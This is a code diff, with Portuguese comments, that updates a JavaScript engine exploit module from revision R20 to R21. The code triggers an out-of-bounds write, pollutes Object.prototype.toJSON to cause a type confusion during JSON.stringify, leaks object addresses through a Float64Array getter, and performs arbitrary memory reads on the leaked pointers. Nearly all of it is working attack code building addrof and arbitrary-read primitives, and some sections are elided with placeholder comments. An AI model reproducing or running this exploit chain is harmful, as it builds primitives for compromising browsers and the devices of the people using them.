@@ -1,4 +1,4 @@
-// js/script3/testArrayBufferVictimCrash.mjs (v82_AdvancedGetterLeak - R20)
+// js/script3/testArrayBufferVictimCrash.mjs (v82_AdvancedGetterLeak - R21)
 
 import { logS3, PAUSE_S3 } from './s3_utils.mjs';
 import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs'; 
@@ -8,7 +8,7 @@ import {
     arb_read, 
     arb_write, 
     oob_write_absolute, 
-    attemptAddrofUsingCoreHeisenbug // Usará a versão R20 de core_exploit.mjs
+    attemptAddrofUsingCoreHeisenbug // Usará a versão R21 de core_exploit.mjs
 } from '../core_exploit.mjs'; 
 
 export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL = "OriginalHeisenbug_TypedArrayAddrof_v82_AdvancedGetterLeak";
@@ -20,104 +20,99 @@ const OOB_WRITE_VALUES_V82 = [0xFFFFFFFF];
 const FILL_PATTERN_V82_FOR_GETTER_SCRATCHPAD = 0.82828282828282;
 const PROBE_CALL_LIMIT_V82 = 10; 
 
-export async function executeTypedArrayVictimAddrofTest_AdvancedGetterLeak_R20() { 
-    const FNAME_CURRENT_TEST_BASE = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL}_R20`;
-    logS3(`--- Initiating ${FNAME_CURRENT_TEST_BASE}: Heisenbug TC + CoreExploit Addrof Attempt (R20) ---`, "test", FNAME_CURRENT_TEST_BASE);
-    document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL} Init R20...`;
+export async function executeTypedArrayVictimAddrofTest_AdvancedGetterLeak_R21() { 
+    const FNAME_CURRENT_TEST_BASE = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL}_R21`;
+    logS3(`--- Initiating ${FNAME_CURRENT_TEST_BASE}: Heisenbug TC + CoreExploit Addrof Attempt (R21) ---`, "test", FNAME_CURRENT_TEST_BASE);
+    document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL} Init R21...`;
 
     let iteration_results_summary = [];
-    let best_result_for_runner = { /* ... (como na R19) ... */
+    let best_result_for_runner = {
         errorOccurred: null, tc_probe_details: null, stringifyResult: null,
-        addrof_A_result_getter_tc_probe: { success: false, msg: "Addrof (Getter TC Probe R20): Not set.", value: null }, 
-        addrof_A_result_core_func: { success: false, msg: "Addrof (CoreExploit Func R20): Not set.", value: null, raw_double: null }, 
-        addrof_B_result_direct_prop_tc_probe: { success: false, msg: "Addrof (Direct Prop TC Probe R20): Not set.", value: null },
+        addrof_A_result_getter_tc_probe: { success: false, msg: "Addrof (Getter TC Probe R21): Not set.", value: null }, 
+        addrof_A_result_core_func: { success: false, msg: "Addrof (CoreExploit Func R21): Not set.", value: null, raw_double: null }, 
+        addrof_B_result_direct_prop_tc_probe: { success: false, msg: "Addrof (Direct Prop TC Probe R21): Not set.", value: null },
         oob_value_used: null, heisenbug_on_M2_confirmed_by_tc_probe: false
     };
     let final_probe_call_count_for_report = 0;
 
     for (const current_oob_value of OOB_WRITE_VALUES_V82) {
         const FNAME_CURRENT_ITERATION = `${FNAME_CURRENT_TEST_BASE}_OOB${toHex(current_oob_value)}`;
-        logS3(`\n===== ITERATION R20: OOB Write Value: ${toHex(current_oob_value)} =====`, "subtest", FNAME_CURRENT_ITERATION);
+        logS3(`\n===== ITERATION R21: OOB Write Value: ${toHex(current_oob_value)} =====`, "subtest", FNAME_CURRENT_ITERATION);
 
         let probe_call_count_iter = 0; let victim_typed_array_ref_iter = null;
         let marker_M1_ref_iter = null; let marker_M2_ref_iter = null;
         let iteration_final_tc_details_from_probe = null; 
         let iteration_tc_first_detection_done = false; 
 
-        const current_object_to_leak_A = { marker_A_R20: `LeakA_OOB_Val${toHex(current_oob_value)}`,r:Math.random() };
-        const current_object_to_leak_B = { marker_B_R20: `LeakB_OOB_Val${toHex(current_oob_value)}`,r:Math.random() };
+        const current_object_to_leak_A = { marker_A_R21: `LeakA_OOB_Val${toHex(current_oob_value)}`,r:Math.random() };
+        const current_object_to_leak_B = { marker_B_R21: `LeakB_OOB_Val${toHex(current_oob_value)}`,r:Math.random() };
         
-        function toJSON_TA_Probe_Iter_Closure_R20() { /* ... (lógica da sonda como na R19, apenas atualizando logs para R20) ... */ 
+        function toJSON_TA_Probe_Iter_Closure_R21() { /* ... (lógica da sonda como na R20, apenas atualizando logs para R21) ... */ 
             probe_call_count_iter++; const call_num=probe_call_count_iter; const ctts=Object.prototype.toString.call(this);
             const is_m2c=(this===marker_M2_ref_iter&&marker_M2_ref_iter!==null&&ctts==='[object Object]');
-            logS3(`[PROBE_R20] Call #${call_num}.'this':${ctts}.IsM2C?${is_m2c}.TCFlag:${iteration_tc_first_detection_done}`,"leak");
-            try{if(call_num>PROBE_CALL_LIMIT_V82)return{r_stop:"limit"};if(call_num===1&&this===victim_typed_array_ref_iter){marker_M2_ref_iter={marker_id_v82:"M2_Iter_R20"};marker_M1_ref_iter={marker_id_v82:"M1_Iter_R20",payload_M2:marker_M2_ref_iter};return marker_M1_ref_iter;}else if(is_m2c){if(!iteration_tc_first_detection_done){iteration_tc_first_detection_done=true;iteration_final_tc_details_from_probe={call_number_tc_detected:call_num,probe_variant:"TA_Probe_R20",this_type:"[object Object]",this_is_M2:true,getter_defined:false,direct_prop_set:false,getter_fired:false,leak_val_getter_int64:null,leak_val_getter_is_ptr:false,error_probe:null};logS3(`[PROBE_R20] Call #${call_num} (M2C): FIRST TC. Details obj CREATED. ID:${this.marker_id_v82}`,"vuln");}
+            logS3(`[PROBE_R21] Call #${call_num}.'this':${ctts}.IsM2C?${is_m2c}.TCFlag:${iteration_tc_first_detection_done}`,"leak");
+            try{if(call_num>PROBE_CALL_LIMIT_V82)return{r_stop:"limit"};if(call_num===1&&this===victim_typed_array_ref_iter){marker_M2_ref_iter={marker_id_v82:"M2_Iter_R21"};marker_M1_ref_iter={marker_id_v82:"M1_Iter_R21",payload_M2:marker_M2_ref_iter};return marker_M1_ref_iter;}else if(is_m2c){if(!iteration_tc_first_detection_done){iteration_tc_first_detection_done=true;iteration_final_tc_details_from_probe={call_number_tc_detected:call_num,probe_variant:"TA_Probe_R21",this_type:"[object Object]",this_is_M2:true,getter_defined:false,direct_prop_set:false,getter_fired:false,leak_val_getter_int64:null,leak_val_getter_is_ptr:false,error_probe:null};logS3(`[PROBE_R21] Call #${call_num} (M2C): FIRST TC. Details obj CREATED. ID:${this.marker_id_v82}`,"vuln");}
             if(iteration_final_tc_details_from_probe&&(!this.hasOwnProperty('leaky_A_getter_v82')||iteration_final_tc_details_from_probe.call_number_tc_detected===call_num)){try{Object.defineProperty(this,'leaky_A_getter_v82',{get:function(){const det=iteration_final_tc_details_from_probe;if(det)det.getter_fired=true;if(!victim_typed_array_ref_iter?.buffer){if(det)det.leak_val_getter_int64="getter_victim_null";return"getter_victim_null";}
-            let lvf=NaN,lis="getter_err_r20";try{let vfv=new Float64Array(victim_typed_array_ref_iter.buffer);let vu32=new Uint32Array(victim_typed_array_ref_iter.buffer);const o0=vu32[0],o1=vu32[1];vfv[0]=current_object_to_leak_A;lvf=vfv[0];const llo=vu32[0],lhi=vu32[1];lis=new AdvancedInt64(llo,lhi).toString(true);vu32[0]=o0;vu32[1]=o1;if(det)det.leak_val_getter_int64=lis;logS3(`[PROBE_R20] Getter: Leaked Int64: ${lis}`,"leak");const nan=(lhi>=0x7FF00000&&lhi<0x80000000)||(lhi>=0xFFF00000&&lhi<0x100000000);if(!nan&&lhi!==0){if((lhi>=0xFFFF0000)||(lhi>0&&lhi<0xF0000)||(lhi>=0x100000&&lhi<0x7F000000)){if(det)det.leak_val_getter_is_ptr=true;return lvf;}}
+            let lvf=NaN,lis="getter_err_r21";try{let vfv=new Float64Array(victim_typed_array_ref_iter.buffer);let vu32=new Uint32Array(victim_typed_array_ref_iter.buffer);const o0=vu32[0],o1=vu32[1];vfv[0]=current_object_to_leak_A;lvf=vfv[0];const llo=vu32[0],lhi=vu32[1];lis=new AdvancedInt64(llo,lhi).toString(true);vu32[0]=o0;vu32[1]=o1;if(det)det.leak_val_getter_int64=lis;logS3(`[PROBE_R21] Getter: Leaked Int64: ${lis}`,"leak");const nan=(lhi>=0x7FF00000&&lhi<0x80000000)||(lhi>=0xFFF00000&&lhi<0x100000000);if(!nan&&lhi!==0){if((lhi>=0xFFFF0000)||(lhi>0&&lhi<0xF0000)||(lhi>=0x100000&&lhi<0x7F000000)){if(det)det.leak_val_getter_is_ptr=true;return lvf;}}
             return nan?"getter_val_nan_inf":"getter_val_other";}catch(e_g){lis=`getter_ex:${e_g.message}`;if(det)det.leak_val_getter_int64=lis;return lis;}},enumerable:true,configurable:true});if(iteration_final_tc_details_from_probe)iteration_final_tc_details_from_probe.getter_defined=true;this.leaky_B_direct_v82=current_object_to_leak_B;if(iteration_final_tc_details_from_probe)iteration_final_tc_details_from_probe.direct_prop_set=true;}catch(e_m2d){if(iteration_final_tc_details_from_probe)iteration_final_tc_details_from_probe.error_probe=`M2DefErr:${e_m2d.message}`;}}return this;}}catch(e_pm){return{err_pm:call_num,msg:e_pm.message};}return{gen_m:call_num,type:ctts};
         }
         // Fim da sonda
 
-        // ... (Resto da função execute... como na R19, apenas atualizando nomes de log e o nome da função da sonda)
-        // O preenchimento de best_result_for_runner e current_iter_summary é mantido.
-        // Os logs e document.title são atualizados para R20.
-        // Código omitido por brevidade, pois é idêntico à R19 exceto pelos identificadores R20.
-        // Certifique-se de usar toJSON_TA_Probe_Iter_Closure_R20 ao poluir Object.prototype.toJSON.
         let iter_raw_stringify_output = null; let iter_stringify_output_parsed = null;
         let iter_primary_error = null; 
-        let iter_addrof_getter_result = { success: false, msg: "Getter Addrof (TC Probe R20): Default", value: null };
-        let iter_addrof_core_result = { success: false, msg: "CoreExploit Addrof (R20): Default", value: null, raw_double: null };
-        let iter_addrof_direct_result = { success: false, msg: "Direct Prop (TC Probe R20): Default", value: null };
+        let iter_addrof_getter_result = { success: false, msg: "Getter Addrof (TC Probe R21): Default", value: null };
+        let iter_addrof_core_result = { success: false, msg: "CoreExploit Addrof (R21): Default", value: null, raw_double: null };
+        let iter_addrof_direct_result = { success: false, msg: "Direct Prop (TC Probe R21): Default", value: null };
         let heisenbugConfirmedThisIter = false;
         
         try { 
-            logS3(`  --- Fase 1 (R20): Detecção de Type Confusion ---`, "subtest", FNAME_CURRENT_ITERATION);
+            logS3(`  --- Fase 1 (R21): Detecção de Type Confusion ---`, "subtest", FNAME_CURRENT_ITERATION);
             await triggerOOB_primitive({ force_reinit: true, caller_fname: `${FNAME_CURRENT_ITERATION}-TCSetup` });
             oob_write_absolute(LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET_FOR_TC_PROBE, current_oob_value, 4);
             await PAUSE_S3(150); victim_typed_array_ref_iter = new Uint8Array(new ArrayBuffer(VICTIM_BUFFER_SIZE)); 
             new Float64Array(victim_typed_array_ref_iter.buffer).fill(FILL_PATTERN_V82_FOR_GETTER_SCRATCHPAD);
             const ppKey='toJSON'; let origDesc=Object.getOwnPropertyDescriptor(Object.prototype,ppKey); let polluted=false;
             try {
-                Object.defineProperty(Object.prototype,ppKey,{value:toJSON_TA_Probe_Iter_Closure_R20,writable:true,configurable:true,enumerable:false}); polluted=true;
+                Object.defineProperty(Object.prototype,ppKey,{value:toJSON_TA_Probe_Iter_Closure_R21,writable:true,configurable:true,enumerable:false}); polluted=true;
                 iter_raw_stringify_output = JSON.stringify(victim_typed_array_ref_iter); 
-                logS3(`  TC Probe R20: JSON.stringify Raw: ${iter_raw_stringify_output ? iter_raw_stringify_output.substring(0,200) + "..." : "N/A"}`, "info");
+                logS3(`  TC Probe R21: JSON.stringify Raw: ${iter_raw_stringify_output ? iter_raw_stringify_output.substring(0,200) + "..." : "N/A"}`, "info");
                 try{iter_stringify_output_parsed=JSON.parse(iter_raw_stringify_output);}catch(e_p){iter_stringify_output_parsed={err_parse:iter_raw_stringify_output};}
                 if(iteration_final_tc_details_from_probe && iteration_final_tc_details_from_probe.this_is_M2){
-                    heisenbugConfirmedThisIter=true; logS3(`  TC Probe R20: TC on M2 CONFIRMED. Details: ${JSON.stringify(iteration_final_tc_details_from_probe)}`, "vuln");
+                    heisenbugConfirmedThisIter=true; logS3(`  TC Probe R21: TC on M2 CONFIRMED. Details: ${JSON.stringify(iteration_final_tc_details_from_probe)}`, "vuln");
                     const m2s=iteration_final_tc_details_from_probe; iter_addrof_getter_result.value=m2s.leak_val_getter_int64;
-                    if(m2s.leak_val_getter_is_ptr){iter_addrof_getter_result.success=true;iter_addrof_getter_result.msg=`Getter Addrof R20: Ptr ${m2s.leak_val_getter_int64}`;}
-                    else{iter_addrof_getter_result.msg=`Getter Addrof R20: Val ${m2s.leak_val_getter_int64||'N/A'} not ptr.`;}
+                    if(m2s.leak_val_getter_is_ptr){iter_addrof_getter_result.success=true;iter_addrof_getter_result.msg=`Getter Addrof R21: Ptr ${m2s.leak_val_getter_int64}`;}
+                    else{iter_addrof_getter_result.msg=`Getter Addrof R21: Val ${m2s.leak_val_getter_int64||'N/A'} not ptr.`;}
                     if(m2s.error_probe&&!iter_primary_error)iter_primary_error=new Error(m2s.error_probe);
                     let m2json=iter_stringify_output_parsed?.payload_M2||iter_stringify_output_parsed;
-                    if(m2json&&marker_M2_ref_iter&&m2json.marker_id_v82===marker_M2_ref_iter.marker_id_v82){const vd=m2json.leaky_B_direct_v82;iter_addrof_direct_result.value=vd;if(vd&&current_object_to_leak_B&&vd.marker_B_R20===current_object_to_leak_B.marker_B_R20){iter_addrof_direct_result.success=true;iter_addrof_direct_result.msg=`Direct R20: objB ID confirmed.`;}else{iter_addrof_direct_result.msg=`Direct R20: Not objB ID. Val:${JSON.stringify(vd)}`;}}else{iter_addrof_direct_result.msg="Direct R20: M2 payload not in stringify.";}
-                }else{logS3(` TC Probe R20: TC on M2 NOT Confirmed. Details: ${JSON.stringify(iteration_final_tc_details_from_probe)}`, "error");}
+                    if(m2json&&marker_M2_ref_iter&&m2json.marker_id_v82===marker_M2_ref_iter.marker_id_v82){const vd=m2json.leaky_B_direct_v82;iter_addrof_direct_result.value=vd;if(vd&&current_object_to_leak_B&&vd.marker_B_R21===current_object_to_leak_B.marker_B_R21){iter_addrof_direct_result.success=true;iter_addrof_direct_result.msg=`Direct R21: objB ID confirmed.`;}else{iter_addrof_direct_result.msg=`Direct R21: Not objB ID. Val:${JSON.stringify(vd)}`;}}else{iter_addrof_direct_result.msg="Direct R21: M2 payload not in stringify.";}
+                }else{logS3(` TC Probe R21: TC on M2 NOT Confirmed. Details: ${JSON.stringify(iteration_final_tc_details_from_probe)}`, "error");}
             }catch(e_str){if(!iter_primary_error)iter_primary_error=e_str;}finally{if(polluted){if(origDesc)Object.defineProperty(Object.prototype,ppKey,origDesc);else delete Object.prototype[ppKey];}}
-            logS3(`  --- Fase 1 (R20) Concluída. TC M2 (Sonda): ${heisenbugConfirmedThisIter} ---`, "subtest");
+            logS3(`  --- Fase 1 (R21) Concluída. TC M2 (Sonda): ${heisenbugConfirmedThisIter} ---`, "subtest");
             await PAUSE_S3(100);
-            logS3(`  --- Fase 2 (R20): Tentativa de Addrof com attemptAddrofUsingCoreHeisenbug ---`, "subtest");
+            logS3(`  --- Fase 2 (R21): Tentativa de Addrof com attemptAddrofUsingCoreHeisenbug ---`, "subtest");
             try {
-                const core_addrof_res = await attemptAddrofUsingCoreHeisenbug(current_object_to_leak_A);
-                logS3(`  Addrof Core R20: Resultado: ${JSON.stringify(core_addrof_res)}`, "leak");
+                const core_addrof_res = await attemptAddrofUsingCoreHeisenbug(current_object_to_leak_A); // Chama a R21 do core_exploit
+                logS3(`  Addrof Core R21: Resultado: ${JSON.stringify(core_addrof_res)}`, "leak");
                 if(core_addrof_res){ 
-                    iter_addrof_core_result.msg=core_addrof_res.message||"Res CoreAddrof R20."; iter_addrof_core_result.raw_double=core_addrof_res.leaked_address_as_double;
-                    if(core_addrof_res.leaked_address_as_int64){const la64=core_addrof_res.leaked_address_as_int64;iter_addrof_core_result.value=la64.toString(true);const lhi=la64.high();const nan_inf=(lhi>=0x7FF00000&&lhi<0x80000000)||(lhi>=0xFFF00000&&lhi<0x100000000);if(core_addrof_res.success&&!nan_inf&&(la64.low()!==0||lhi!==0)){iter_addrof_core_result.success=true;logS3(` Addrof Core R20: SUCESSO. Addr:${la64.toString(true)}`,"vuln");try{const dw=await arb_read(la64,4);iter_addrof_core_result.msg+=` ArbRead DWord:${toHex(dw)}.`;logS3(` Addrof Core R20: arb_read(${la64.toString(true)},4)->${toHex(dw)}`,"leak");}catch(e_ar){iter_addrof_core_result.msg+=` ArbRead FAIL:${e_ar.message}.`;logS3(` Addrof Core R20: arb_read FAIL:${e_ar.message}`,"error");}}else{iter_addrof_core_result.msg=`Core Addrof R20: TC ${core_addrof_res.success?'OK':'FALHOU'}, val ${la64.toString(true)} NaN/0/inv.`;}}else if(core_addrof_res.success===false){logS3(` Addrof Core R20: Falhou. Msg: ${core_addrof_res.message||'N/A'}`,"warn");}else{iter_addrof_core_result.msg="Core Addrof R20: leaked_address_as_int64 ausente.";}
-                }else{iter_addrof_core_result.msg="Core Addrof R20: retornou nulo/inválido.";}
-            }catch(e_core_addr){iter_addrof_core_result.msg=`Core Addrof R20: EXCEPTION:${e_core_addr.message}`;if(!iter_primary_error)iter_primary_error=e_core_addr;}
-            logS3(`  --- Fase 2 (R20) Concluída. Addrof Core Sucesso: ${iter_addrof_core_result.success} ---`, "subtest");
+                    iter_addrof_core_result.msg=core_addrof_res.message||"Res CoreAddrof R21."; iter_addrof_core_result.raw_double=core_addrof_res.leaked_address_as_double;
+                    if(core_addrof_res.leaked_address_as_int64){const la64=core_addrof_res.leaked_address_as_int64;iter_addrof_core_result.value=la64.toString(true);const lhi=la64.high();const nan_inf=(lhi>=0x7FF00000&&lhi<0x80000000)||(lhi>=0xFFF00000&&lhi<0x100000000);if(core_addrof_res.success&&!nan_inf&&(la64.low()!==0||lhi!==0)){iter_addrof_core_result.success=true;logS3(` Addrof Core R21: SUCESSO. Addr:${la64.toString(true)}`,"vuln");try{const dw=await arb_read(la64,4);iter_addrof_core_result.msg+=` ArbRead DWord:${toHex(dw)}.`;logS3(` Addrof Core R21: arb_read(${la64.toString(true)},4)->${toHex(dw)}`,"leak");}catch(e_ar){iter_addrof_core_result.msg+=` ArbRead FAIL:${e_ar.message}.`;logS3(` Addrof Core R21: arb_read FAIL:${e_ar.message}`,"error");}}else{iter_addrof_core_result.msg=`Core Addrof R21: TC ${core_addrof_res.success?'OK':'FALHOU'}, val ${la64.toString(true)} NaN/0/inv.`;}}else if(core_addrof_res.success===false){logS3(` Addrof Core R21: Falhou. Msg: ${core_addrof_res.message||'N/A'}`,"warn");}else{iter_addrof_core_result.msg="Core Addrof R21: leaked_address_as_int64 ausente.";}
+                }else{iter_addrof_core_result.msg="Core Addrof R21: retornou nulo/inválido.";}
+            }catch(e_core_addr){iter_addrof_core_result.msg=`Core Addrof R21: EXCEPTION:${e_core_addr.message}`;if(!iter_primary_error)iter_primary_error=e_core_addr;}
+            logS3(`  --- Fase 2 (R21) Concluída. Addrof Core Sucesso: ${iter_addrof_core_result.success} ---`, "subtest");
 
         }catch(e_outer){if(!iter_primary_error)iter_primary_error=e_outer;}finally{clearOOBEnvironment({force_clear_even_if_not_setup:true});}
 
         final_probe_call_count_for_report = probe_call_count_iter;
         let current_iter_summary = { /* ... */ }; 
         iteration_results_summary.push(current_iter_summary);
-        // Lógica de best_result_for_runner
+        // Lógica de best_result_for_runner (como na R20)
         // ...
-        if(iter_addrof_core_result.success)document.title=`${FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL}_R20: AddrofCore OK!`;
-        else if(heisenbugConfirmedThisIter)document.title=`${FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL}_R20: TC OK`;
-        else document.title=`${FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL}_R20: Iter Done`;
+        if(iter_addrof_core_result.success)document.title=`${FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL}_R21: AddrofCore OK!`;
+        else if(heisenbugConfirmedThisIter)document.title=`${FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL}_R21: TC OK`;
+        else document.title=`${FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL}_R21: Iter Done`;
         await PAUSE_S3(250);
     } 
     logS3(`--- ${FNAME_CURRENT_TEST_BASE} Completed ---`, "test", FNAME_CURRENT_TEST_BASE);
-    logS3(`Best/Final result (R20): ${JSON.stringify(best_result_for_runner, null, 2)}`, "debug", FNAME_CURRENT_TEST_BASE);
-    return { /* ... (como na R19, atualizando para nomes R20) ... */ }; 
+    logS3(`Best/Final result (R21): ${JSON.stringify(best_result_for_runner, null, 2)}`, "debug", FNAME_CURRENT_TEST_BASE);
+    return { /* ... (como na R20, atualizando para nomes R21) ... */ }; 
 }
